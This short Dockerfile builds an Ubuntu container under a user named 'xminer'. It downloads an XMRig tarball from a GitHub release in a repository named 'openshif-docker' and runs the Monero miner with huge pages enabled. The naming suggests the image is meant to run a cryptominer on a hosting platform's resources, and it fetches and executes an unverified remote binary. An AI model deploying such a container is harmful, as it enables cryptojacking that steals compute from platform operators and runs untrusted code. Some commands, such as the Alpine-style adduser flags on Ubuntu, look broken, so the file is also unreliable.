FROM  ubuntu
RUN adduser -S -D -H -h /xmrig-2.6.2 xminer
RUN apt-get update && apt-get install -y wget
RUN apt-get install -y psmisc
RUN apt-get install -y bash
RUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/xmrig001.tar.gz
RUN tar -xvzf xmrig001.tar.gz
USER xminer
WORKDIR xmrig-2.6.2/
CMD bash -c "sysctl -w vm.nr_hugepages=128 && ./xmrig && sleep 100 && killall xmrig"

